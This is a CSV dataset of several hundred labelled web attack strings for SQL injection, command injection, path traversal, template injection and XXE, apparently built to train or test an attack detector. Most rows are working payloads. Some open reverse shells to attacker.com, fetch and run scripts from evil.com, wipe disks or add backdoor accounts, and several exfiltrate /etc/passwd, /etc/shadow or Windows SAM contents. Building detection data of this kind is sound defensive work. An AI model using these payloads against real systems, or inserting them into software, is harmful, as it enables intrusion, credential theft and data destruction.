"text","label"
"1' AND (SELECT COUNT(*) FROM information_schema.columns)>0--","SQLi"
"1' UNION SELECT table_name FROM information_schema.tables--","SQLi"
"1' UNION SELECT column_name FROM information_schema.columns--","SQLi"
"1' UNION SELECT user()--","SQLi"
"1' UNION SELECT database()--","SQLi"
"1' UNION SELECT version()--","SQLi"
"1' UNION SELECT @@version--","SQLi"
"1' UNION SELECT @@datadir--","SQLi"
"1' UNION SELECT load_file('/etc/passwd')--","SQLi"
"1' AND SLEEP(10)--","SQLi"
"1' AND BENCHMARK(1000000,MD5(1))--","SQLi"
"1' UNION SELECT null, table_name FROM information_schema.tables--","SQLi"
"1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--","SQLi"
"admin' AND 1=1--","SQLi"
"admin') OR ('1'='1","SQLi"
"1 UNION SELECT 1, version(), user()","SQLi"
"1 OR 1=1 LIMIT 1","SQLi"
"1; WAITFOR DELAY '0:0:5'","SQLi"
"1' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user())))--","SQLi"
"id=-1 UNION SELECT 1, 2, 3, 4","SQLi"
"(SELECT * FROM users WHERE id=1)","SQLi"
"1 || (SELECT SLEEP(5))","SQLi"
"1' OR '1'='1' AND 1=1","SQLi"
"1 AND 1=1; --","SQLi"
"%27%20OR%201=1","SQLi"
"admin'--","SQLi"
"' or 1=1 limit 1 --","SQLi"
"' or 1=1 limit 1 #","SQLi"
"1' order by 1 --","SQLi"
"1' union select 1,2,3 --","SQLi"
"1' union select 1,2,3 #","SQLi"
"1' union select 1,2,3 /*","SQLi"
"1' union select 1,2,3 limit 1 --","SQLi"
"1' union select 1,2,3 limit 1 #","SQLi"
"1' union select 1,2,3 limit 1 /*","SQLi"
"; ls","COMMAND_INJECTION"
"; ls -la","COMMAND_INJECTION"
"; whoami","COMMAND_INJECTION"
"; id","COMMAND_INJECTION"
"; pwd","COMMAND_INJECTION"
"; cat /etc/passwd","COMMAND_INJECTION"
"; wget http://evil.com/shell.sh","COMMAND_INJECTION"
"; curl http://evil.com/backdoor","COMMAND_INJECTION"
"& dir","COMMAND_INJECTION"
"& whoami","COMMAND_INJECTION"
"& ipconfig","COMMAND_INJECTION"
"& netstat -an","COMMAND_INJECTION"
"| ls","COMMAND_INJECTION"
"| cat /etc/passwd","COMMAND_INJECTION"
"| whoami","COMMAND_INJECTION"
"| id","COMMAND_INJECTION"
"|| whoami","COMMAND_INJECTION"
"|| ls -la","COMMAND_INJECTION"
"|| cat /etc/shadow","COMMAND_INJECTION"
"`whoami`","COMMAND_INJECTION"
"`id`","COMMAND_INJECTION"
"`cat /etc/passwd`","COMMAND_INJECTION"
"`ls -la`","COMMAND_INJECTION"
"$(whoami)","COMMAND_INJECTION"
"$(id)","COMMAND_INJECTION"
"$(cat /etc/passwd)","COMMAND_INJECTION"
"$(ls -la)","COMMAND_INJECTION"
"$(curl http://evil.com)","COMMAND_INJECTION"
"; nc -e /bin/sh attacker.com 4444","COMMAND_INJECTION"
"& nc -e cmd.exe attacker.com 4444","COMMAND_INJECTION"
"| nc attacker.com 4444 -e /bin/bash","COMMAND_INJECTION"
"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","COMMAND_INJECTION"
"; python -c 'import socket'","COMMAND_INJECTION"
"; perl -e 'use Socket'","COMMAND_INJECTION"
"; ruby -rsocket","COMMAND_INJECTION"
"; php -r '$sock=fsockopen()'","COMMAND_INJECTION"
"127.0.0.1; ls","COMMAND_INJECTION"
"127.0.0.1 && dir","COMMAND_INJECTION"
"127.0.0.1 | cat /etc/passwd","COMMAND_INJECTION"
"127.0.0.1 || whoami","COMMAND_INJECTION"
"8.8.8.8; wget http://evil.com/shell","COMMAND_INJECTION"
"google.com & netstat","COMMAND_INJECTION"
"; ping -c 10 127.0.0.1","COMMAND_INJECTION"
"& ping -n 10 127.0.0.1","COMMAND_INJECTION"
"| sleep 10","COMMAND_INJECTION"
"cat /etc/passwd","COMMAND_INJECTION"
"nc -lvvp 4444","COMMAND_INJECTION"
"netcat -e /bin/sh 1.2.3.4 80","COMMAND_INJECTION"
"ping -c 1 127.0.0.1","COMMAND_INJECTION"
"$(reboot)","COMMAND_INJECTION"
"`sleep 10`","COMMAND_INJECTION"
"eval('phpinfo();')","COMMAND_INJECTION"
"system('id')","COMMAND_INJECTION"
"; uname -a","COMMAND_INJECTION"
"& hostname","COMMAND_INJECTION"
"| ps aux","COMMAND_INJECTION"
"$(cat /etc/shadow)","COMMAND_INJECTION"
"`env`","COMMAND_INJECTION"
"; killall -9 httpd","COMMAND_INJECTION"
"& tasklist","COMMAND_INJECTION"
"| ifconfig","COMMAND_INJECTION"
"$(rm -rf /)","COMMAND_INJECTION"
"; chmod 777 /etc/passwd","COMMAND_INJECTION"
"& net user hacker password /add","COMMAND_INJECTION"
"| iptables -F","COMMAND_INJECTION"
"$(wget http://evil.com/backdoor.sh -O /tmp/bd.sh && sh /tmp/bd.sh)","COMMAND_INJECTION"
"; curl http://evil.com/malware | bash","COMMAND_INJECTION"
"; chown root:root /etc/passwd","COMMAND_INJECTION"
"& reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe","COMMAND_INJECTION"
"| find / -name config.php","COMMAND_INJECTION"
"$(export PATH=/tmp:$PATH)","COMMAND_INJECTION"
"`crontab -l`","COMMAND_INJECTION"
"; systemctl stop firewalld","COMMAND_INJECTION"
"& sc create backdoor binPath= C:\\backdoor.exe","COMMAND_INJECTION"
"| mount -t nfs attacker.com:/share /mnt","COMMAND_INJECTION"
"$(echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers)","COMMAND_INJECTION"
"; iptables -A INPUT -p tcp --dport 4444 -j ACCEPT","COMMAND_INJECTION"
"& powershell -ExecutionPolicy Bypass -File C:\\backdoor.ps1","COMMAND_INJECTION"
"| useradd -m -s /bin/bash hacker","COMMAND_INJECTION"
"$(dd if=/dev/zero of=/dev/sda bs=1M)","COMMAND_INJECTION"
"../../../etc/passwd","PATH_TRAVERSAL"
"..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
"....//....//....//etc/passwd","PATH_TRAVERSAL"
"..%2F..%2F..%2Fetc%2Fpasswd","PATH_TRAVERSAL"
"..%252F..%252F..%252Fetc%252Fpasswd","PATH_TRAVERSAL"
"....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
"....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
"..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
"/app/../../../etc/passwd","PATH_TRAVERSAL"
"..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
"..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
"../../../../etc/shadow","PATH_TRAVERSAL"
"/var/www/html/../../../../etc/hosts","PATH_TRAVERSAL"
"file:///etc/passwd","PATH_TRAVERSAL"
"C:\\Windows\\System32\\drivers\\etc\\hosts","PATH_TRAVERSAL"
"../../../../../../../../../../etc/passwd","PATH_TRAVERSAL"
"..\..\..\..\..\..\..\..\windows\win.ini","PATH_TRAVERSAL"
"/etc/passwd%00","PATH_TRAVERSAL"
"....//....//....//windows/win.ini","PATH_TRAVERSAL"
"..%c1%9c..%c1%9c..%c1%9cetc/passwd","PATH_TRAVERSAL"
"..%c0%afetc%c0%afpasswd","PATH_TRAVERSAL"
"/var/www/../../etc/passwd","PATH_TRAVERSAL"
"C:/windows/system32/config/sam","PATH_TRAVERSAL"
"..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
"....//....//....//....//etc/passwd%00","PATH_TRAVERSAL"
"/etc/shadow%00.jpg","PATH_TRAVERSAL"
"../../../../../../../../../../windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
"file:///c:/windows/win.ini","PATH_TRAVERSAL"
"php://filter/convert.base64-encode/resource=index.php","PATH_TRAVERSAL"
"php://filter/read=string.rot13/resource=index.php","PATH_TRAVERSAL"
"zip://shell.zip%23shell.php","PATH_TRAVERSAL"
"phar://shell.phar/shell.php","PATH_TRAVERSAL"
"expect://id","PATH_TRAVERSAL"
"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=","PATH_TRAVERSAL"
"/proc/self/environ","PATH_TRAVERSAL"
"/proc/self/cmdline","PATH_TRAVERSAL"
"/proc/self/fd/0","PATH_TRAVERSAL"
"/proc/version","PATH_TRAVERSAL"
"/proc/net/tcp","PATH_TRAVERSAL"
"....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
"..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
"....\/....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
"..;/..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
"/app/../../../../../../etc/passwd","PATH_TRAVERSAL"
"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
"..%5c..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
"....//....//....//....//windows/system32/config/sam","PATH_TRAVERSAL"
"../../../../../../../../../../var/log/apache2/access.log","PATH_TRAVERSAL"
"file:///var/www/html/../../etc/passwd","PATH_TRAVERSAL"
"C:\\inetpub\\wwwroot\\..\\..\\..\\..\\windows\\system32\\config\\sam","PATH_TRAVERSAL"
"/etc/passwd%00.txt","PATH_TRAVERSAL"
"....//....//....//....//etc/shadow%00","PATH_TRAVERSAL"
"../../../../../../../../../../usr/local/apache2/conf/httpd.conf","PATH_TRAVERSAL"
"file:///c:/windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
"php://filter/convert.base64-encode/resource=../../../etc/passwd","PATH_TRAVERSAL"
"zip://upload.zip%23shell.txt","PATH_TRAVERSAL"
"phar://upload.phar/shell.txt","PATH_TRAVERSAL"
"expect://ls","PATH_TRAVERSAL"
"data://text/plain,<?php system($_GET['cmd']); ?>","PATH_TRAVERSAL"
"/proc/self/fd/1","PATH_TRAVERSAL"
"/proc/self/fd/2","PATH_TRAVERSAL"
"/proc/cpuinfo","PATH_TRAVERSAL"
"/proc/meminfo","PATH_TRAVERSAL"
"....//....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
"..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
"../../../../../../../../../../var/lib/postgresql/data/pg_hba.conf","PATH_TRAVERSAL"
"file:///usr/local/nginx/conf/nginx.conf","PATH_TRAVERSAL"
"C:\\xampp\\htdocs\\..\\..\\..\\..\\windows\\system32\\config\\system","PATH_TRAVERSAL"
"....//....//....//....//....//....//....//etc/passwd","PATH_TRAVERSAL"
"..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","PATH_TRAVERSAL"
"....\/....\/....\/....\/....\/....\/....\/etc/passwd","PATH_TRAVERSAL"
"..;/..;/..;/..;/..;/..;/etc/passwd","PATH_TRAVERSAL"
"/app/../../../../../../../../../../etc/passwd","PATH_TRAVERSAL"
"..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","PATH_TRAVERSAL"
"..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini","PATH_TRAVERSAL"
"....//....//....//....//....//windows/system32/drivers/etc/hosts","PATH_TRAVERSAL"
"../../../../../../../../../../opt/lampp/etc/httpd.conf","PATH_TRAVERSAL"
"file:///var/lib/mysql/mysql/user.MYD","PATH_TRAVERSAL"
"C:\\wamp\\bin\\apache\\apache2.4.46\\conf\\httpd.conf","PATH_TRAVERSAL"
"${7*7}","SSTI"
"{{7*7}}","SSTI"
"{{config}}","SSTI"
"{{config.items()}}","SSTI"
"{{request}}","SSTI"
"{{request.application}}","SSTI"
"{{''.class.mro()[1].subclasses()}}","SSTI"
"{{[].__class__.__base__.__subclasses__()}}","SSTI"
"<#assign ex=object?api.newInstance()>","SSTI"
"${T(java.lang.Runtime).getRuntime().exec('calc')}","SSTI"
"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}","SSTI"
"{{lipsum.__globals__.os.popen('id').read()}}","SSTI"
"{{url_for.__globals__.os.popen('id').read()}}","SSTI"
"{{g.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","SSTI"
"${@java.lang.Runtime@getRuntime().exec('calc')}","SSTI"
"<#assign cmd='freemarker.template.utility.Execute'?new()>${cmd('id')}","SSTI"
"<%= File.open('/etc/passwd').read %>","SSTI"
"#{File.read('/etc/passwd')}","SSTI"
"*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","SSTI"
"${T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')}","SSTI"
"{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}","SSTI"
"{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}}","SSTI"
"{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}","SSTI"
"<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.io.File','/etc/passwd').text}","SSTI"
"${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}","SSTI"
"<%= IO.popen('id').read %>","SSTI"
"#{`id`}","SSTI"
"*{T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(whoami)')}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('subprocess').check_output('id',shell=True)}}","SSTI"
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","SSTI"
"{{dict.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}","SSTI"
"${T(javax.script.ScriptEngineManager).newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(\calc\"")')}""","SSTI"
"{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}","SSTI"
"<%= system('id') %>","SSTI"
"#{T(java.lang.Runtime).getRuntime().exec('calc')}","SSTI"
"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}","SSTI"
"{{7*'7'}}","SSTI"
"${7*'7'}","SSTI"
"<%= 7*'7' %>","SSTI"
"{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('id',shell=True)}}","SSTI"
"{{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}","SSTI"
"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}","SSTI"
"${T(java.lang.Runtime).getRuntime().exec('wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh')}","SSTI"
"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('wget http://evil.com/backdoor')}","SSTI"
"{{request.application.__globals__.__builtins__.__import__('os').system('nc -e /bin/sh attacker.com 4444')}}","SSTI"
"{{config.__class__.__init__.__globals__['os'].popen('curl http://evil.com/malware | bash').read()}}","SSTI"
"<%= `whoami` %>","SSTI"
"#{system('id')}","SSTI"
"*{T(java.lang.Runtime).getRuntime().exec('cmd /c calc')}","SSTI"
"{{7**7}}","SSTI"
"${7**7}","SSTI"
"{{request.__class__}}","SSTI"
"{{request.__class__.__mro__}}","SSTI"
"{{request.__class__.__mro__[1]}}","SSTI"
"{{''.__class__.__bases__[0].__subclasses__()}}","SSTI"
"{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}","SSTI"
"{{cycler.__init__.__globals__.os.popen('id').read()}}","SSTI"
"{{joiner.__init__.__globals__.os.popen('id').read()}}","SSTI"
"{{namespace.__init__.__globals__.os.popen('id').read()}}","SSTI"
"${T(java.lang.System).getenv()}","SSTI"
"${T(java.lang.System).getProperty('user.dir')}","SSTI"
"{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}","SSTI"
"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}","SSTI"
"${T(java.lang.Runtime).getRuntime().exec('whoami')}","SSTI"
"{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/shadow').read()}}","SSTI"
"<%= 7*7 %>","SSTI"
"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('id')}}","SSTI"
"{{request.application.__globals__.__builtins__.eval(\__import__('os').popen('id').read()\"")}}""","SSTI"
"{{config.__class__.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}","SSTI"
"${@java.lang.System@getProperty('java.version')}","SSTI"
"<%= File.read('/etc/shadow') %>","SSTI"
"#{File.open('/etc/passwd').read}","SSTI"
"*{new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))}","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].check_output('whoami',shell=True)}}","SSTI"
"${T(java.lang.Runtime).getRuntime().exec('bash -c whoami')}","SSTI"
"<#assign ex='freemarker.template.utility.Execute'?new()>${ex('ls -la')}","SSTI"
"<%= `ls -la` %>","SSTI"
"{{''.__class__.__mro__[2].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('whoami').read()}}","SSTI"
"<xml><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe.dtd'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE x [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><r>&xxe;</r>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///var/www/html/config.php'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/shadow'><!ENTITY % dtd SYSTEM 'http://attacker.com/xxe.dtd'>%dtd;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'expect://whoami'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><test>&xxe;</test>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/.htaccess'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % blind SYSTEM 'http://attacker.com/?data=%file;'><!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>%blind;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/inetpub/wwwroot/web.config'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/panther/unattend.xml'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/program files/apache/conf/httpd.conf'>]><data>&file;</data>","XXE"
"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///c:/users/administrator/desktop/passwords.txt'><!ENTITY % dtd SYSTEM 'http://attacker.com/win.dtd'>%dtd;%xxe;]>","XXE"
"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file://127.0.0.1/c$/windows/win.ini'>]><foo>&xxe;</foo>","XXE"
"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/config/sam'>]><foo>&xxe;</foo>","XXE"
"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/sudoers'>]><foo>&xxe;</foo>","XXE"
